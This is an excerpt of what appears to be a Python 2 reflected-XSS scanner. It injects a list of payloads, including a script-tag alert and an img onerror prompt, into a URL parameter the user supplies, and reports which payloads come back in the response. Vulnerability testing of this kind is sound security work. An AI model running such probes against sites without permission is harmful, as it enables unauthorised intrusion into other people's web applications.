...
def test(url , payload, param):
    r = requests.get(url.replace(param+"=", param+"="+payload))
    return payload in r.text
payload = ["\"><script>alert(1)</script>","'\"><img src=x onerror=prompt(/test/)>",
...
url = raw_input("URL = ")
param = raw_input("Parameter to test : ")
vul = 0
nvul = 0
for p in payload:
    if test(url, p, param):
        print colored('URL vulnerable with payload : ','yellow'); print "%s"%p
        vul += 1
    else:
        print colored('Failed to inject payload : ', 'red')
        nvul += 1
print ":::::::::::::::::::::"
print colored('URL vulnerable : ','yellow'); print "%s"%vul
print ":::::::::::::::::::::"
print colored('Failed : ', 'red'); print "%s" %nvul
